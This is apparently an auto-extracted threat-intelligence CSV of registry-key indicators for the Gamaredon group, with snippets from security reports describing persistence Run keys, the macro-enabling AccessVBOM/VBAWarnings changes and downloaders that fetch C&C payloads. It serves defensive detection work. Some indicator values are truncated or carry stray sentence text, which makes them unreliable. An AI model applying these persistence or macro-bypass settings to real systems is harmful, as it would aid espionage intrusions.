1.0.0,actor--gamaredon,artifact--sha256:518c1846ac7f80726559a1f28b5bc1b3d866aea88a609a636d84128557da9396,observation--sha256:91a56d04939050dfe387e3695977d513d94608e766411c21babdfae92c4e6bb6,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\ScanForUpdatesAsUse,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\ScanForUpdatesAsUse,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:d4c106f3cbacb5b88b24fb3eb6b32fbd27617ed5e325ffc7e136665143ddd73a,observation--sha256:ef042797e60a395258685440895b1c478c6d9710e02438bfdc1e5a3cec4b235f,registry-key,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\regName,HKCU\Software \Microsoft \Windows \CurrentVersion \Run\regName,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:14a23aceda5624e85c3e7a7d0f40f69b1e5aa30909e17f88f13503f2acf10798,observation--sha256:0bb26b9180402c74e499087d679a2b0f2aaff67d56150873ea31c52af12007b6,registry-key,HKCU\Software \[a-zA-Z0-9]{19,HKCU\Software \[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"46 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Mutexes %PROCESSOR_IDENTIFIER% %COMPUTERNAME% Scheduled task names dropbox %COMPUTERNAME% %COMPUTERNAME%_1 APPENDIX G: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPSDOOR Name Value Installation paths HKCU\Software \[a-zA-Z0-9]{19,25} HKCU\Abstractions \[a-zA-Z0-9]{19,25} HKCU\AppEvents \[a-zA-Z0-9]{19,25} HKCU\Printers \[a-zA-Z0-9]{19,25} %USERPROFILE% \%PROCESSOR_LEVEL%_%PROCESSOR_REVISION% \data\geoip %US",
1.0.0,actor--gamaredon,artifact--sha256:14a23aceda5624e85c3e7a7d0f40f69b1e5aa30909e17f88f13503f2acf10798,observation--sha256:ec292a87e4d383bd707143e442186f74e13d52e0c39dee30ae60ff59b8d6c013,registry-key,HKCU\Software \[a-zA-Z0-9]{19,HKCU\Software \[a-zA-Z0-9]{19,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"47 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERNAME%_%USERNAM E% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%USERDOMAIN% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME% HKCU\Software \Microsoft \Windows \CurrentVersion \Run\%COMPUTERNAME%2 HKCU\Software \Microsoft \Windows \Curr",
1.0.0,actor--gamaredon,artifact--sha256:a30dd0ca269c7afe9581e0ddef1246fc21dab0c6129efc06b586d7c98d6eed41,observation--sha256:d6336415bd24d1066670eddd49d2e4b2d384ce2a86aaa1297b7114f45a136473,registry-key,HKCU\Software\EnterpriseMode,HKCU\Software\EnterpriseMode,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:f30c924bc16407b2ec584735f3bd4e0815025b2da8474b0dcc9848916266dfdf,observation--sha256:db17c4f284689eb2fc10bb1b0674e4f591e5bc0319622f3f3701560b776fd0f6,registry-key,HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM,HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 First, PteroDoc enables programmatic access to VBA projects and enables all Word macros by setting the following registry values to 1: · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings The <WordVersion> is variable and dynamically resolved from the Word.Application VBScript object by PteroDoc during i",
1.0.0,actor--gamaredon,artifact--sha256:7be706f77b5585f07cfa1e8c393cd36306e1721de29465e99698404e95c34b7c,observation--sha256:ad93c209596c5ab3582f5bf4ba7673b997c131e08bfc68d4b7f206ea0be63dc6,registry-key,HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings,HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 First, PteroDoc enables programmatic access to VBA projects and enables all Word macros by setting the following registry values to 1: · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings The <WordVersion> is variable and dynamically resolved from the Word.Application VBScript object by PteroDoc during i",
1.0.0,actor--gamaredon,artifact--sha256:bc05d14058008e287c3b751d41a4dc3f32e8275ffaba071a3a92c3bccaed4302,observation--sha256:e0587186c10a2cb83ba2dfde2af40d81fbdb14f8ac405ef81f11aec450e47ef8,registry-key,HKCU\Software\Microsoft \Windows\CurrentVersion \Uninstall\ .,HKCU\Software\Microsoft \Windows\CurrentVersion \Uninstall\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:526265a075887a846a5266db65c50269fc598e6d75f65497b320444436136ebc,observation--sha256:e121a844ebb3386c7c2905b8acbc72d0b044b0b28a9528c53472fe6e92cabb9f,registry-key,HKCU\Software\Microsoft\Office\<WordVersion> \Common\Internet\Server Cache .,HKCU\Software\Microsoft\Office\<WordVersion> \Common\Internet\Server Cache,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 First, PteroDoc enables programmatic access to VBA projects and enables all Word macros by setting the following registry values to 1: · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings The <WordVersion> is variable and dynamically resolved from the Word.Application VBScript object by PteroDoc during i",
1.0.0,actor--gamaredon,artifact--sha256:62014d7fa82ac2ad572017d42e0c4ba268bd2e563d027b34ce63e0dcf0c82f0b,observation--sha256:1f2bfe1bbeb1a60f2d4ef098b163e67a713c323f5cc696da536d06bd80ba2931,registry-key,HKCU\Software\Microsoft\Office\<WordVersion> \Common\Internet\Server Cache . Third,HKCU\Software\Microsoft\Office\<WordVersion> \Common\Internet\Server Cache . Third,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 First, PteroDoc enables programmatic access to VBA projects and enables all Word macros by setting the following registry values to 1: · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings The <WordVersion> is variable and dynamically resolved from the Word.Application VBScript object by PteroDoc during i",
1.0.0,actor--gamaredon,artifact--sha256:a64b914d9f23b098bf0cacaa014611d7e2cbc3f7c14b6e749c6dbc479c893eea,observation--sha256:49f8229d313cdc86a6874dc5f7ac8c28268eccd3a0722ca2f097197df50083df,registry-key,HKCU\Software\Microsoft\Office\<versio,HKCU\Software\Microsoft\Office\<versio,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Techniques used in cyberattack (according to MITRE ATT & CK Matrix) Tactics ID Name Description Initial Access T1566 .001 Spearphishing Attachment Group sends spear phishing emails with malicious attachments or links .002 Spearphishing Link Execution T1059 .001 PowerShell Group executes ps1 scripts in system .005 Visual Basic Group executes numerous vbs scripts in system T1053 .005 Scheduled Task Group sets up scheduled tasks to launch scripts and downloaded tasklist T1047 WMI Group uses WMI com,
1.0.0,actor--gamaredon,artifact--sha256:a64b914d9f23b098bf0cacaa014611d7e2cbc3f7c14b6e749c6dbc479c893eea,observation--sha256:94894735074ee4456040545bfc152c2730399273717c92689d689af886abf7ba,registry-key,HKCU\Software\Microsoft\Office\<versio,HKCU\Software\Microsoft\Office\<versio,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,HKCU\Software\Microsoft\Office\<versio n>\<product>\Security\AccessVBOM T1036 Masquerading Group places components into Windows folder with names mimicking common system services or drivers T1221 Template Injection DOCX files contain a request body to download malicious DOT document templates T1497 .002 Virtualization/Sandbox Evasion Malware pings for DNS servers and checks for launched processes. Also try to identify sandbox name and compare it with hardcoded namelist T1218 .011 Signed Binary P,
1.0.0,actor--gamaredon,artifact--sha256:c92c670d7f27485f123071faf04cb7b321e8982767be40bed0862dcd689033de,observation--sha256:4fdd572b40bddf61705b6e2200c6e533c76b0af5943345ac2b7fc8bfb598675d,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion \Run,HKCU\Software\Microsoft\Windows\CurrentVersion \Run,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:0c902f8a4c862965c63496e7336df364cb536c582288fd04d768379c60277931,observation--sha256:7ac0c395145e732c4d53b47164a6e00edc89986de145a72dec91044881f3811e,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to execute the downloaded,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to execute the downloaded,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:a48fe16723bdbc4b0982608d9f0c98caf868e31de170f2409a841cd168458616,observation--sha256:f235d9d4d9e885b6a41c5a4784fc9dd9a6e860046f4a14a7d6f9c263a95bac28,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to execute the dropped VBScript w rapper,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to execute the dropped VBScript w rapper,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:f80b262e59cfa30af29623432841788b671a9d2f584e9e149104f2caa87050e4,observation--sha256:c9cbc40241d3a7730b1f8da1ca91aef534463e88f8e73f9cdcea4752273d53a5,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to execute the loader after each system,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to execute the loader after each system,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:041f7ad88bf37e8cf34b1cd6c936e813a3283cee55ad0e478a627760b8055fdb,observation--sha256:7047de3cd6613aa62ab26dca4ebb7c66ef76a04f200c670663fbb918a0016727,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to run,HKCU\Software\Microsoft\Windows\CurrentVersion \Run to run,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:4e2b17cb6a748d7db262fc1c1d0fc1236755674c3afc267a6234fc05e7b675d4,observation--sha256:508b8503de4966cda06905deebaa3f76888a542ed25182bd437e8e2d0c32aafd,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\A,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\A,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"However, it should be noted that only about 200 lines of code are actually functional. All other lines are generated only for distraction, which can be attributed to the program code obfuscation technic. In fact, the first stage now lies in downloading the WGET console utility and scripts to run it, set up persistence fo r rebooting by making changes to the registry and/or task scheduler, as well as collecting information about the system (computer name, disk name, IP -address, login and passwor",
1.0.0,actor--gamaredon,artifact--sha256:3c35e1d30960877ee14f25e761021956bf1236a22306a9d93a103f9a6fc97fa5,observation--sha256:71552c9043a081007dd31bb701cacff4035df9c25b479a6907a7b9f32bd743c8,registry-key,HKCU\System,HKCU\System,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:1716d44df9ba28962367b7303d16f02e53a60dda89198ba23158f87a90b50649,observation--sha256:ac2930b41d21766449aa702a9d4a40467c3c1f0e656cff32f22af0f2be9c6569,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Office\Version\Word\,HKEY_CURRENT_USER\Software\Microsoft\Office\Version\Word\,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersi on\Run\Lnk At the same time, the settings of Microsoft Office Word for invisible documents damage are changed in the registry and run the malware usin g VBA. Changes occur in the registry branch HKEY_CURRENT_USER\Software\Microsoft\Office\Version\Word\ Security with keys AccessVBom and VBAWarnings. By default, these keys are set to ""0"". As a result of unauthorized actions, they are set to ""1"". This bypassing Microsoft Office by default se",
1.0.0,actor--gamaredon,artifact--sha256:6be44963d7a6d4a86cbf20ab0d92f8d8ad77ec52c0f20daabd0253e6e4b950d6,observation--sha256:464295ca0bc83f4522925bc214bde1e3382a9ea8b1c337dac4ea82e9fe2568ec,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVeris,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVeris,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"- repeating the cycle laid down in the file, which allows you to download and run almost any file in the system and provides full control over the system; - checking the file size before start and in case of conformity to conditions, the file is started; - searching for all available disks with letters from ""D"" to ""Z""; - checking for the possibility of creating and executing processes, as well as the presence of a connection to the Internet and to the command & control server of attackers; - dow",
1.0.0,actor--gamaredon,artifact--sha256:255e7090c096c5ebc468e68577290c01a5af6542fd707069206765a5fa8a5b29,observation--sha256:9e23d16ebf55beeab2d56ef832c109b42c382bf51f8dbbe9902a47b1fe11b743,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersi,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersi,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersi on\Run\Lnk At the same time, the settings of Microsoft Office Word for invisible documents damage are changed in the registry and run the malware usin g VBA. Changes occur in the registry branch HKEY_CURRENT_USER\Software\Microsoft\Office\Version\Word\ Security with keys AccessVBom and VBAWarnings. By default, these keys are set to ""0"". As a result of unauthorized actions, they are set to ""1"". This bypassing Microsoft Office by default se",
1.0.0,actor--gamaredon,artifact--sha256:490200af63f2e4fca1a1162106cfdb70851b3c7ab3a71710faeda6c1264afa2a,observation--sha256:f2bb6af3c32b4e2b38d564ce660c0566e0b944f39c4f2f87b4c953214160531c,registry-key,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 4. PteroDum Capabilities PteroDum can fetch and execute up to 10 VBScript payloads from a hardcoded C&C server. When PteroDum receives a response, it expects that response to be a base64 -encoded VBScript with ;; tokens inserted at random positions. After removing those tokens and decoding the result, PteroDum stores the VBScript in a randomly named file with a .vbs extension in the system temporary directory",
1.0.0,actor--gamaredon,artifact--sha256:490200af63f2e4fca1a1162106cfdb70851b3c7ab3a71710faeda6c1264afa2a,observation--sha256:0f20da29d2d3c97529d72921d6e0394292a0cdf77b77e560131a5e625e22ae0e,registry-key,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:490200af63f2e4fca1a1162106cfdb70851b3c7ab3a71710faeda6c1264afa2a,observation--sha256:1b97c1d19a69ac368df34d2124a868ba074a0012379c86b9718af5802ea8caae,registry-key,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 11. PteroEffigy Capabilities PteroEffigy acquires its C&C server from the G oFile cloud storage service using its REST API. Then, from the retrieved C&C server, it can download and execute up to 50 PowerShell payloads. After each individual download attempt, it sleeps for five minutes. Network protocol For communication with its C&C server, PteroEffigy uses an HTTP GET request with the URI path /index.php and",
1.0.0,actor--gamaredon,artifact--sha256:490200af63f2e4fca1a1162106cfdb70851b3c7ab3a71710faeda6c1264afa2a,observation--sha256:962732fcdc7bcfc96ce350b5059cfc6a012136c04331abeb74e38d41f04639d8,registry-key,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:8ac6792084b236615d807ea089bba847c99e1ea4e3ed3d38ea2354bad92d6caa,observation--sha256:fdac7fc248100af2112caca9fd4cc1d7040bc3535131a0015ffdd19bba2a73a4,registry-key,HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\,HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
